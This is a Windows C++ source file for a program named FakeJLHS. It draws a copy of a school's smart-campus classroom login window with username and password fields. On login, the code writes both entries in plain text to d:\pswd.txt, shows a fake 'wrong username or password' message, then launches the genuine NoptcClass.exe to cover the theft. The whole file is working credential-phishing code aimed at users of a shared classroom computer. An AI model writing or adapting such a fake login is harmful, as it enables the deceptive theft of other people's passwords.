// FakeJLHS.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "FakeJLHS.h"

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING] = L"智慧校园";                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING] = L"Fjlhs";            // 主窗口类名
HDC chdc, ctdc; //捕捉窗口dc
HBITMAP cbmp;//捕捉窗口hBmp
HBITMAP HX, HEXIT, HLOGIN, HDOWN, HBG;
bool inX, inEXIT, inLOGIN, inDOWN;
HPEN WhitePen, WP2;
// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

void s(LPCWSTR a)//调试用MessageBox
{
	MessageBox(NULL, a, L"", NULL);
}
void s(int a)
{
	wchar_t tmp[34];
	_itow_s(a, tmp, 10);
	MessageBox(NULL, tmp, L"", NULL);
}
wchar_t Path[300], Name[300];
void GetPath()//得到程序路径 & ( 程序路径 + 程序名 ).
{
	GetModuleFileName(NULL, Path, 301);//直接获取程序名
	wcscpy_s(Name, Path);
	for (int i = (int)wcslen(Path) - 1; i >= 0; --i)
		if (Path[i] == L'\\') {
			Path[i + 1] = 0; return;
		}//把程序名字符串中最后一个"\\"后面的字符去掉就是路径
}
bool InX(HWND hwnd)
{
	POINT po;
	GetCursorPos(&po);
	ScreenToClient(hwnd, &po);
	if (po.x >= 263 && po.y >= 2 && po.x <= 301 && po.y <= 20)return true; else return false;
}
bool InEXIT(HWND hwnd)
{
	POINT po;
	GetCursorPos(&po);
	ScreenToClient(hwnd, &po);
	if (po.x >= 190 && po.y >= 222 && po.x <= 249 && po.y <= 241)return true; else return false;
}
bool InDOWN(HWND hwnd)
{
	POINT po;
	GetCursorPos(&po);
	ScreenToClient(hwnd, &po);
	if (po.x >= 233 && po.y >= 123 && po.x <= 253 && po.y <= 143)return true; else return false;
}
bool InLOGIN(HWND hwnd)
{
	POINT po;
	GetCursorPos(&po);
	ScreenToClient(hwnd, &po);
	if (po.x >= 70 && po.y >= 222 && po.x <= 129 && po.y <= 241)return true; else return false;
}
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: 在此处放置代码。

	MyRegisterClass(hInstance);

	// 执行应用程序初始化:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_FAKEJLHS));

	MSG msg;

	// 主消息循环:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int)msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FAKEJLHS));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_FAKEJLHS);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
HWND Edit1, Edit2;
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // 将实例句柄存储在全局变量中

	HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_POPUP,
		300, 200, 308, 258, nullptr, nullptr, hInstance, nullptr);
	Edit1 = CreateWindowW(L"EDIT", L"", WS_CHILD,
		88, 126, 144, 15, hWnd, nullptr, hInstance, nullptr);
	Edit2 = CreateWindowW(L"EDIT", L"", WS_CHILD|ES_PASSWORD,
		88, 161, 165, 15, hWnd, nullptr, hInstance, nullptr);
	HFONT font=CreateFontW(12 , 6, 0, 0, FW_THIN, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS,\
		CLIP_DEFAULT_PRECIS, PROOF_QUALITY, DEFAULT_PITCH | FF_SWISS, _T("宋体"));
	SendMessage(Edit1, WM_SETFONT, (WPARAM)font, 1);
	SendMessage(Edit2, WM_SETFONT, (WPARAM)font, 1);
	HBG = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(130), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
	HDOWN = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(132), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
	HEXIT = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(133), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
	HLOGIN = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(135), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
	HX = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(136), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
	if (!hWnd)
	{
		return FALSE;
	}
	WhitePen = CreatePen(PS_SOLID, 1, RGB(42, 158, 233));
	WP2 = CreatePen(PS_SOLID, 1, RGB(191, 197, 201));
	ShowWindow(hWnd, SW_SHOW);
	ShowWindow(Edit1, SW_SHOW);
	ShowWindow(Edit2, SW_SHOW);
	UpdateWindow(hWnd);

	return TRUE;
}
BOOL RunEXE(wchar_t* CmdLine, DWORD flag, STARTUPINFO* si)
{//用CreateProcess来创建进程
	STARTUPINFO s = { 0 };
	if (si == nullptr)si = &s;
	PROCESS_INFORMATION pi = { 0 };
	return CreateProcess(NULL, CmdLine, NULL, NULL, FALSE, flag, NULL, NULL, si, &pi);
}
int Msv;
#define redraw() InvalidateRect(hWnd,nullptr,false),UpdateWindow(hWnd)
//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
#define _CRT_SECURE_NO_WARNINGS 
#pragma warning(disable:4996)
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
	{
		ctdc = GetDC(hWnd);
		chdc = CreateCompatibleDC(ctdc);
		cbmp = CreateCompatibleBitmap(ctdc, GetDeviceCaps(GetDC(NULL), HORZRES), GetDeviceCaps(GetDC(NULL), VERTRES));
		SelectObject(chdc, cbmp);
		ReleaseDC(hWnd, ctdc);
		break;
	}

	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		ctdc = BeginPaint(hWnd, &ps);
		HBRUSH BitmapBrush = CreatePatternBrush(HBG);//绘制xiaofei签名
		SelectObject(chdc, BitmapBrush);
		SelectObject(chdc, WhitePen);
		Rectangle(chdc, 0, 0, 308, 258);
		DeleteObject(BitmapBrush);
		if (inX)
		{
			HBRUSH BitmapBrush2 = CreatePatternBrush(HX);
			SelectObject(chdc, BitmapBrush2);
			//SelectObject(chdc, WP2);
			Rectangle(chdc, 37 * 10 - 1, 19 * 20 - 1, 37 * 11 + 1, 19 * 21 + 1);
			BitBlt(chdc, 264, 3, 37, 19, chdc, 37 * 10, 19 * 20, SRCCOPY);
			DeleteObject(BitmapBrush2);
		}
		if (inDOWN)
		{
			HBRUSH BitmapBrush3 = CreatePatternBrush(HDOWN);
			SelectObject(chdc, BitmapBrush3);
			Rectangle(chdc, 21 * 20 - 1, 22 * 18 - 1, 21 * 21 + 1, 22 * 19 + 1);
			BitBlt(chdc, 233, 122, 21,22, chdc, 21 * 20, 22 * 18, SRCCOPY);
			DeleteObject(BitmapBrush3);
		}
		if (inEXIT)
		{
			HBRUSH BitmapBrush4 = CreatePatternBrush(HEXIT);
			SelectObject(chdc, BitmapBrush4);
			Rectangle(chdc, 60 * 8 - 1, 20 * 18 - 1, 60 * 9 + 1, 20 * 19 + 1);
			BitBlt(chdc, 190, 222, 60, 20, chdc, 60 * 8, 20 * 18, SRCCOPY);
			DeleteObject(BitmapBrush4);
		}
		if (inLOGIN)
		{
			HBRUSH BitmapBrush5 = CreatePatternBrush(HLOGIN);
			SelectObject(chdc, BitmapBrush5);
			Rectangle(chdc, 60 * 8 - 1, 20 * 18 - 1, 60 * 9 + 1, 20 * 19 + 1);
			BitBlt(chdc, 70, 222, 60, 20, chdc, 60 * 8, 20 * 18, SRCCOPY);
			DeleteObject(BitmapBrush5);
		}
		BitBlt(ctdc, 0, 0, 308, 258, chdc, 0, 0, SRCCOPY);
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_MOUSEMOVE:
	{
		bool newbool = InX(hWnd);
		if (newbool != inX)inX = newbool, redraw();
		newbool = InDOWN(hWnd);
		if (newbool != inDOWN)inDOWN = newbool, redraw();
		newbool = InLOGIN(hWnd);
		if (newbool != inLOGIN)inLOGIN = newbool, redraw();
		newbool = InEXIT(hWnd);
		if (newbool != inEXIT)inEXIT = newbool, redraw();
		if (Msv == 0)
		{
			TRACKMOUSEEVENT tme;
			tme.cbSize = sizeof(tme);//检测鼠标移进移出的函数
			tme.hwndTrack = hWnd;//在鼠标移出窗体时会触发一个WM_LEAVE消息，根据这个可以改变按钮颜色
			tme.dwFlags = TME_LEAVE;//缺点是当焦点直接被另一个窗口夺取时(比如按下windows键)
			TrackMouseEvent(&tme);//什么反应都没有
			Msv = 1;//移出
		}
		else Msv = 0;//移进
		break;
	}
	case WM_LBUTTONDOWN:
	{
		POINT po;
		GetCursorPos(&po);
		ScreenToClient(hWnd, &po);
		if(po.y<30&&(!InX(hWnd)))PostMessage(hWnd, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0);
		break;
	}
	case WM_LBUTTONUP:
	{
		if (InX(hWnd) || InEXIT(hWnd))ExitProcess(0);
		if (InLOGIN(hWnd))
		{
			char tmpstr[101] = {0};
			GetWindowTextA(Edit1, tmpstr, 100);
			strcat(tmpstr, " ");
			HANDLE hFile;
			hFile = CreateFileA("d:\\pswd.txt",
				GENERIC_WRITE,//对文件的操作
				0, // 共享的方式 0 不能共享
				NULL,// 安全属性 用缺省的
				OPEN_ALWAYS, //创建一个新的文件
				FILE_ATTRIBUTE_NORMAL, // 文件属性
				NULL); // 模板文件的句柄
			SetFilePointer(hFile, NULL, NULL, FILE_END);
			DWORD dwWrites;
			WriteFile(hFile, //文件句柄
				tmpstr, //指针 向文件写入的数据 
				strlen(tmpstr), // 相要写的数据长度
				&dwWrites, //实际写入的长度
				NULL); //同步IO或是异步IO的方式 如果是同步 程序会被挂起一直到读写完成
			GetWindowTextA(Edit2, tmpstr, 100);
			strcat(tmpstr,"\n");
			WriteFile(hFile, //文件句柄
				tmpstr, //指针 向文件写入的数据 
				strlen(tmpstr), // 相要写的数据长度
				&dwWrites, //实际写入的长度
				NULL); //同步IO或是异步IO的方式 如果是同步 程序会被挂起一直到读写完成
			CloseHandle(hFile);
			wchar_t realPath[301];
			wcscpy_s(realPath, Path);
			wcscat_s(realPath, L"NoptcClass.exe");
			MessageBox(hWnd, L"用户名或密码错误!", L"金陵中学智慧校园教室", 0);
			RunEXE(realPath, 0, nullptr);
			ExitProcess(0);

		}
	}
	case WM_MOUSELEAVE://TrackMouseEvent带来的消息
		PostMessage(hWnd, WM_MOUSEMOVE, NULL, 0);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}
